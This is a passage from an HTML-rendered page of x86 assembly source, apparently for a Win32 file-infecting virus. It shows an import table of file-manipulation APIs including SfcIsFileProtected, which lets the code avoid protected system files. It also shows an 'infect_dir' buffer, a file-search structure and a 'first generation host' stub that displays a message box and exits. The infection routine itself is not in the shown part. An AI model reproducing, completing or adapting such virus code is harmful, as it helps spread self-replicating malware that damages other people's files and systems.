</span><span class="sc5">FindFirstFileA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FindNextFileA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FindClose</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CreateFileA</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">DeleteFileA</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SetFilePointer</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SetFileAttributesA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CloseHandle</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CreateFileMappingA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">MapViewOfFile</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">UnmapViewOfFile</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SetEndOfFile</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetFileSize</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GlobalAlloc</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GlobalFree</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">LoadLibraryA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FreeLibrary</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">GetTickCount</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SfcIsFileProtected</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">current_dir</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">infect_dir</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">         </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">WFD_dwFileAttributes</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_ftCreationTime</span><span class="sc0">      </span><span class="sc9">dq</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_ftLastAccessTime</span><span class="sc0">    </span><span class="sc9">dq</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_ftLastWriteTime</span><span class="sc0">     </span><span class="sc9">dq</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_nFileSizeHigh</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_dwReserved0</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_dwReserved1</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WFD_szFileName</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">WFD_szAlternateFileName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">WFD_Size</span><span class="sc0">                </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">


</span><span class="sc5">heap_end</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc1">; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">
</span><span class="sc1">; | First generation host                                                   |</span><span class="sc0">
</span><span class="sc1">; *-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*</span><span class="sc0">

</span><span class="sc5">first_gen_host</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szMsg</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szTtl</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">host</span><span class="sc0">
</span></div></body>
</html>
